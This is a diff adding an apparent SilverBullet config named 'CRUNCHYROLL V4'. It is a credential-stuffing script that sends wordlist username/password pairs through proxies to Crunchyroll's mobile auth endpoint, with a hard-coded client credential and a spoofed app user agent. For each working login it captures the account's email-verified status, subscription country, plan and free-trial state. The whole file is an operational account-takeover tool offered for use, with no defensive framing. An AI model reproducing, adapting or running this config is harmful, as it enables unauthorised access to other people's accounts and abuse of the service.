@@ -1,0 +1,304 @@
+[SETTINGS]
+{
+  "Name": "CRUNCHYROLL @Guevarag1",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2025-06-08T00:32:58.8087941+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "CRUNCHYROLL V4 @AR4US",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "A" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "CO" 
+
+FUNCTION URLEncode "<USER>" -> VAR "EM" 
+
+REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token" 
+  CONTENT "username=<EM>&password=<CO>&grant_type=password&scope=offline_access&device_id=<A>&device_name=AR4US-AL20&device_type=AR4US%20G011A" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Authorization: Basic bndkcWVocWRkb3hla25jNDQ1ZW86U3YwYXhOTTlOQnk0S3A4Tm8ySHpkUE4tMnlWOXZVaVo=" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "ETP-Anonymous-ID: 88eed6f8-8b89-4894-baa4-591311cf05e7" 
+  HEADER "Host: www.crunchyroll.com" 
+  HEADER "User-Agent: Crunchyroll/3.78.3 Android/9 okhttp/4.12.0" 
+  HEADER "x-datadog-sampling-priority: 0" 
+
+#FK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+    KEY "invalid_grant" 
+  KEYCHAIN Success OR 
+    KEY "access_token\":" 
+
+#TTK PARSE "<SOURCE>" LR "\"access_token\":\"" "\"" -> VAR "TTK" 
+
+#GET_ID REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me" 
+  
+  HEADER "Authorization: Bearer <TTK>" 
+  HEADER "user-agent: Crunchyroll/3.74.2 Android/10 okhttp/4.12.0" 
+
+#AID PARSE "<SOURCE>" LR "\"external_id\":\"" "\"" -> VAR "AID" 
+
+#EV PARSE "<SOURCE>" LR "email_verified\":" ",\"" CreateEmpty=FALSE -> CAP "Email Verified" "⟪ " " ⟫" 
+
+#GET_COUNTRY REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<AID>/benefits" 
+  
+  HEADER "Authorization: Bearer <TTK>" 
+  HEADER "user-agent: Crunchyroll/3.74.2 Android/10 okhttp/4.12.0" 
+
+#COUNTRY PARSE "<SOURCE>" LR "subscription_country\":\"" "\"," -> VAR "cc" 
+
+#COUNTRY FUNCTION Translate 
+  KEY "US" VALUE "United States 🇺🇸" 
+  KEY "CA" VALUE "Canada 🇨🇦" 
+  KEY "MX" VALUE "Mexico 🇲🇽" 
+  KEY "GT" VALUE "Guatemala 🇬🇹" 
+  KEY "BZ" VALUE "Belize 🇧🇿" 
+  KEY "HN" VALUE "Honduras 🇭🇳" 
+  KEY "SV" VALUE "El Salvador 🇸🇻" 
+  KEY "NI" VALUE "Nicaragua 🇳🇮" 
+  KEY "CR" VALUE "Costa Rica 🇨🇷" 
+  KEY "PA" VALUE "Panama 🇵🇦" 
+  KEY "BR" VALUE "Brazil 🇧🇷" 
+  KEY "AR" VALUE "Argentina 🇦🇷" 
+  KEY "CL" VALUE "Chile 🇨🇱" 
+  KEY "CO" VALUE "Colombia 🇨🇴" 
+  KEY "PE" VALUE "Peru 🇵🇪" 
+  KEY "VE" VALUE "Venezuela 🇻🇪" 
+  KEY "EC" VALUE "Ecuador 🇪🇨" 
+  KEY "BO" VALUE "Bolivia 🇧🇴" 
+  KEY "PY" VALUE "Paraguay 🇵🇾" 
+  KEY "UY" VALUE "Uruguay 🇺🇾" 
+  KEY "GY" VALUE "Guyana 🇬🇾" 
+  KEY "SR" VALUE "Suriname 🇸🇷" 
+  KEY "ZA" VALUE "South Africa 🇿🇦" 
+  KEY "EG" VALUE "Egypt 🇪🇬" 
+  KEY "MA" VALUE "Morocco 🇲🇦" 
+  KEY "DZ" VALUE "Algeria 🇩🇿" 
+  KEY "TN" VALUE "Tunisia 🇹🇳" 
+  KEY "LY" VALUE "Libya 🇱🇾" 
+  KEY "SD" VALUE "Sudan 🇸🇩" 
+  KEY "SO" VALUE "Somalia 🇸🇴" 
+  KEY "ET" VALUE "Ethiopia 🇪🇹" 
+  KEY "KE" VALUE "Kenya 🇰🇪" 
+  KEY "UG" VALUE "Uganda 🇺🇬" 
+  KEY "TZ" VALUE "Tanzania 🇹🇿" 
+  KEY "RW" VALUE "Rwanda 🇷🇼" 
+  KEY "BI" VALUE "Burundi 🇧🇮" 
+  KEY "CG" VALUE "Congo 🇨🇬" 
+  KEY "CD" VALUE "DR Congo 🇨🇩" 
+  KEY "CM" VALUE "Cameroon 🇨🇲" 
+  KEY "NG" VALUE "Nigeria 🇳🇬" 
+  KEY "GH" VALUE "Ghana 🇬🇭" 
+  KEY "CI" VALUE "Ivory Coast 🇨🇮" 
+  KEY "SN" VALUE "Senegal 🇸🇳" 
+  KEY "ML" VALUE "Mali 🇲🇱" 
+  KEY "BF" VALUE "Burkina Faso 🇧🇫" 
+  KEY "MR" VALUE "Mauritania 🇲🇷" 
+  KEY "NE" VALUE "Niger 🇳🇪" 
+  KEY "TD" VALUE "Chad 🇹🇩" 
+  KEY "GA" VALUE "Gabon 🇬🇦" 
+  KEY "GQ" VALUE "Equatorial Guinea 🇬🇶" 
+  KEY "BJ" VALUE "Benin 🇧🇯" 
+  KEY "TG" VALUE "Togo 🇹🇬" 
+  KEY "LR" VALUE "Liberia 🇱🇷" 
+  KEY "SL" VALUE "Sierra Leone 🇸🇱" 
+  KEY "GM" VALUE "Gambia 🇬🇲" 
+  KEY "GW" VALUE "Guinea-Bissau 🇬🇼" 
+  KEY "GN" VALUE "Guinea 🇬🇳" 
+  KEY "ZW" VALUE "Zimbabwe 🇿🇼" 
+  KEY "ZM" VALUE "Zambia 🇿🇲" 
+  KEY "MW" VALUE "Malawi 🇲🇼" 
+  KEY "MZ" VALUE "Mozambique 🇲🇿" 
+  KEY "AO" VALUE "Angola 🇦🇴" 
+  KEY "NA" VALUE "Namibia 🇳🇦" 
+  KEY "BW" VALUE "Botswana 🇧🇼" 
+  KEY "SS" VALUE "South Sudan 🇸🇸" 
+  KEY "ER" VALUE "Eritrea 🇪🇷" 
+  KEY "DJ" VALUE "Djibouti 🇩🇯" 
+  KEY "LS" VALUE "Lesotho 🇱🇸" 
+  KEY "SZ" VALUE "Eswatini 🇸🇿" 
+  KEY "KM" VALUE "Comoros 🇰🇲" 
+  KEY "CV" VALUE "Cape Verde 🇨🇻" 
+  KEY "ST" VALUE "São Tomé & Príncipe 🇸🇹" 
+  KEY "SC" VALUE "Seychelles 🇸🇨" 
+  KEY "MU" VALUE "Mauritius 🇲🇺" 
+  KEY "SA" VALUE "Saudi Arabia 🇸🇦" 
+  KEY "IR" VALUE "Iran 🇮🇷" 
+  KEY "IQ" VALUE "Iraq 🇮🇶" 
+  KEY "AE" VALUE "United Arab Emirates 🇦🇪" 
+  KEY "IL" VALUE "Israel 🇮🇱" 
+  KEY "TR" VALUE "Turkey 🇹🇷" 
+  KEY "SY" VALUE "Syria 🇸🇾" 
+  KEY "JO" VALUE "Jordan 🇯🇴" 
+  KEY "LB" VALUE "Lebanon 🇱🇧" 
+  KEY "OM" VALUE "Oman 🇴🇲" 
+  KEY "KW" VALUE "Kuwait 🇰🇼" 
+  KEY "QA" VALUE "Qatar 🇶🇦" 
+  KEY "BH" VALUE "Bahrain 🇧🇭" 
+  KEY "YE" VALUE "Yemen 🇾🇪" 
+  KEY "PS" VALUE "Palestine 🇵🇸" 
+  KEY "AF" VALUE "Afghanistan 🇦🇫" 
+  KEY "TM" VALUE "Turkmenistan 🇹🇲" 
+  KEY "UZ" VALUE "Uzbekistan 🇺🇿" 
+  KEY "TJ" VALUE "Tajikistan 🇹🇯" 
+  KEY "KG" VALUE "Kyrgyzstan 🇰🇬" 
+  KEY "KZ" VALUE "Kazakhstan 🇰🇿" 
+  KEY "AZ" VALUE "Azerbaijan 🇦🇿" 
+  KEY "AM" VALUE "Armenia 🇦🇲" 
+  KEY "GE" VALUE "Georgia 🇬🇪" 
+  KEY "CN" VALUE "China 🇨🇳" 
+  KEY "JP" VALUE "Japan 🇯🇵" 
+  KEY "KR" VALUE "South Korea 🇰🇷" 
+  KEY "KP" VALUE "North Korea 🇰🇵" 
+  KEY "IN" VALUE "India 🇮🇳" 
+  KEY "ID" VALUE "Indonesia 🇮🇩" 
+  KEY "PK" VALUE "Pakistan 🇵🇰" 
+  KEY "BD" VALUE "Bangladesh 🇧🇩" 
+  KEY "VN" VALUE "Vietnam 🇻🇳" 
+  KEY "TH" VALUE "Thailand 🇹🇭" 
+  KEY "MM" VALUE "Myanmar 🇲🇲" 
+  KEY "MY" VALUE "Malaysia 🇲🇾" 
+  KEY "PH" VALUE "Philippines 🇵🇭" 
+  KEY "SG" VALUE "Singapore 🇸🇬" 
+  KEY "LK" VALUE "Sri Lanka 🇱🇰" 
+  KEY "NP" VALUE "Nepal 🇳🇵" 
+  KEY "KH" VALUE "Cambodia 🇰🇭" 
+  KEY "LA" VALUE "Laos 🇱🇦" 
+  KEY "BT" VALUE "Bhutan 🇧🇹" 
+  KEY "MN" VALUE "Mongolia 🇲🇳" 
+  KEY "TL" VALUE "East Timor 🇹🇱" 
+  KEY "BN" VALUE "Brunei 🇧🇳" 
+  KEY "AU" VALUE "Australia 🇦🇺" 
+  KEY "NZ" VALUE "New Zealand 🇳🇿" 
+  KEY "PG" VALUE "Papua New Guinea 🇵🇬" 
+  KEY "FJ" VALUE "Fiji 🇫🇯" 
+  KEY "SB" VALUE "Solomon Islands 🇸🇧" 
+  KEY "VU" VALUE "Vanuatu 🇻🇺" 
+  KEY "NC" VALUE "New Caledonia 🇳🇨" 
+  KEY "PF" VALUE "French Polynesia 🇵🇫" 
+  KEY "WS" VALUE "Samoa 🇼🇸" 
+  KEY "TO" VALUE "Tonga 🇹🇴" 
+  KEY "FM" VALUE "Micronesia 🇫🇲" 
+  KEY "KI" VALUE "Kiribati 🇰🇮" 
+  KEY "NR" VALUE "Nauru 🇳🇷" 
+  KEY "TV" VALUE "Tuvalu 🇹🇻" 
+  KEY "PW" VALUE "Palau 🇵🇼" 
+  KEY "MH" VALUE "Marshall Islands 🇲🇭" 
+  KEY "GB" VALUE "United Kingdom 🇬🇧" 
+  KEY "FR" VALUE "France 🇫🇷" 
+  KEY "DE" VALUE "Germany 🇩🇪" 
+  KEY "IT" VALUE "Italy 🇮🇹" 
+  KEY "ES" VALUE "Spain 🇪🇸" 
+  KEY "PT" VALUE "Portugal 🇵🇹" 
+  KEY "NL" VALUE "Netherlands 🇳🇱" 
+  KEY "BE" VALUE "Belgium 🇧🇪" 
+  KEY "SE" VALUE "Sweden 🇸🇪" 
+  KEY "NO" VALUE "Norway 🇳🇴" 
+  KEY "DK" VALUE "Denmark 🇩🇰" 
+  KEY "FI" VALUE "Finland 🇫🇮" 
+  KEY "IE" VALUE "Ireland 🇮🇪" 
+  KEY "CH" VALUE "Switzerland 🇨🇭" 
+  KEY "AT" VALUE "Austria 🇦🇹" 
+  KEY "GR" VALUE "Greece 🇬🇷" 
+  KEY "PL" VALUE "Poland 🇵🇱" 
+  KEY "RO" VALUE "Romania 🇷🇴" 
+  KEY "CZ" VALUE "Czech Republic 🇨🇿" 
+  KEY "BG" VALUE "Bulgaria 🇧🇬" 
+  KEY "HU" VALUE "Hungary 🇭🇺" 
+  KEY "SK" VALUE "Slovakia 🇸🇰" 
+  KEY "HR" VALUE "Croatia 🇭🇷" 
+  KEY "RS" VALUE "Serbia 🇷🇸" 
+  KEY "BA" VALUE "Bosnia & Herzegovina 🇧🇦" 
+  KEY "AL" VALUE "Albania 🇦🇱" 
+  KEY "LT" VALUE "Lithuania 🇱🇹" 
+  KEY "LV" VALUE "Latvia 🇱🇻" 
+  KEY "EE" VALUE "Estonia 🇪🇪" 
+  KEY "SI" VALUE "Slovenia 🇸🇮" 
+  KEY "MK" VALUE "North Macedonia 🇲🇰" 
+  KEY "ME" VALUE "Montenegro 🇲🇪" 
+  KEY "LU" VALUE "Luxembourg 🇱🇺" 
+  KEY "MT" VALUE "Malta 🇲🇹" 
+  KEY "IS" VALUE "Iceland 🇮🇸" 
+  KEY "MC" VALUE "Monaco 🇲🇨" 
+  KEY "LI" VALUE "Liechtenstein 🇱🇮" 
+  KEY "AD" VALUE "Andorra 🇦🇩" 
+  KEY "SM" VALUE "San Marino 🇸🇲" 
+  KEY "VA" VALUE "Vatican City 🇻🇦" 
+  "<cc>" -> VAR "COUNTR" 
+
+FUNCTION Constant "⟪ <COUNTR> ⟫" -> CAP "COUNTRY" 
+
+#GET_PLAN REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<AID>/products" 
+  
+  HEADER "Authorization: Bearer <TTK>" 
+  HEADER "user-agent: Crunchyroll/3.74.2 Android/10 okhttp/4.12.0" 
+
+#FK KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"total\":0" 
+    KEY "subscription.not_found" 
+    KEY "Subscription Not Found" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#PLAN PARSE "<SOURCE>" LR "name\":\"" "\"," CreateEmpty=FALSE -> CAP "PLAN" "⟪ " " ⟫" 
+
+#FREE_TRIAL PARSE "<SOURCE>" JSON "active_free_trial" CreateEmpty=FALSE -> CAP "FREE TRIAL" "⟪ " " ⟫" 
+
